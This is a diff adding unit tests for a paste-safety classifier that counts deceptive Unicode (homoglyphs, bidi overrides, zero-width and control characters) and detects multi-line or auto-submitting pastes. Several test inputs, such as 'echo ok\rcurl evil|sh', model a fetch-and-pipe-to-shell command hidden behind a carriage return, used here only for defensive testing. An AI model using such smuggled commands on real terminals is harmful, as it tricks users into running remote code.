@@ -962,6 +962,56 @@ eq(_pc.get('bidirectional control'), 1, 'classify: bidi override counted')
 eq(_pc.get('invisible character'), 1, 'classify: zero-width counted')
 eq(_pc.get('non-ASCII character'), 1, 'classify: homoglyph counted')
 eq(_pc.get('control character'), 1, 'classify: control counted')
+
+# classify_paste_detail: the review bar's full 7-class breakdown (incl. zeros) plus
+# the paste's structure facts -- the finer split behind classify_paste's 4 buckets.
+# 0x0430 cyrillic-a (confusable), 0x202E bidi, 0x200B zero-width, BEL control,
+# 0x0301 combining acute, 0x2500 box-drawing (own low-risk row), 0x2603 snowman
+# (honest foreign).
+_seven = ('pay' + chr(0x0430) + 'l' + chr(0x202E) + chr(0x200B) + BEL
+          + chr(0x0301) + chr(0x2500) + chr(0x2603))
+_d = S.classify_paste_detail(_seven)
+_dc = _d['counts']
+eq(_dc['confusable'], 1, 'detail: cyrillic homoglyph counted as confusable')
+eq(_dc['bidi'], 1, 'detail: bidi override counted')
+eq(_dc['invisible'], 1, 'detail: zero-width counted as invisible')
+eq(_dc['control'], 1, 'detail: BEL counted as control')
+eq(_dc['combining'], 1, 'detail: combining acute counted as combining')
+eq(_dc['structural'], 1, 'detail: box-drawing counted as structural (its own row)')
+eq(_dc['nonascii'], 1, 'detail: honest foreign char counted as nonascii')
+eq(sorted(_dc), sorted(S.PASTE_DETAIL_CLASSES),
+   'detail: every class key present (zeros shown too)')
+eq(S.classify_paste_detail('echo hello')['counts'],
+   dict.fromkeys(S.PASTE_DETAIL_CLASSES, 0), 'detail: clean ASCII is all zeros')
+# The finer breakdown must FOLD back to classify_paste's four buckets, so the
+# summary line and the table can never disagree about what a paste hides.
+_fold = {'bidi': 'bidirectional control', 'control': 'control character',
+         'invisible': 'invisible character'}
+_folded = {}
+for _k, _n in _dc.items():
+    if _n:
+        _label = _fold.get(_k, 'non-ASCII character')
+        _folded[_label] = _folded.get(_label, 0) + _n
+eq(_folded, dict(S.classify_paste(_seven)),
+   'classify_paste_detail folds back to classify_paste (no divergence)')
+# structure facts: lines / multiline / ends_with_submit, in step with paste_is_multiline
+eq((_d['lines'], _d['multiline'], _d['ends_with_submit']), (1, False, False),
+   'detail: single-line no-submit payload')
+_ml = S.classify_paste_detail('a\nb\n')
+eq((_ml['lines'], _ml['multiline'], _ml['ends_with_submit']), (2, True, True),
+   'detail: two lines ending in a submit newline')
+_crlf = S.classify_paste_detail('ls\r\n')
+eq((_crlf['lines'], _crlf['multiline'], _crlf['ends_with_submit']), (1, False, True),
+   'detail: CRLF single command is one line but still submits')
+_cr = S.classify_paste_detail('echo ok\rcurl evil')
+eq((_cr['lines'], _cr['multiline'], _cr['ends_with_submit']), (2, True, False),
+   'detail: a lone mid-string CR is a second line, no trailing submit')
+for _t in ('', 'ls', 'ls\n', 'a\nb', 'a\r\nb', 'ls\r\n', 'echo ok\rcurl evil|sh'):
+    eq(S.classify_paste_detail(_t)['multiline'], S.paste_is_multiline(_t),
+       'detail multiline agrees with paste_is_multiline for %r' % _t)
+eq((_d2 := S.classify_paste_detail(chr(0x00E9)))['chars'], 1,
+   'detail: char count (e-acute is one char)')
+eq(_d2['bytes'], 2, 'detail: byte count is UTF-8 length (e-acute is two bytes)')
 # sanitize_paste_unicode: keeps printable non-ASCII, drops the deceptive classes
 eq(S.sanitize_paste_unicode('caf' + chr(0x00E9)), 'caf' + chr(0x00E9),
    'unicode paste keeps printable non-ASCII')
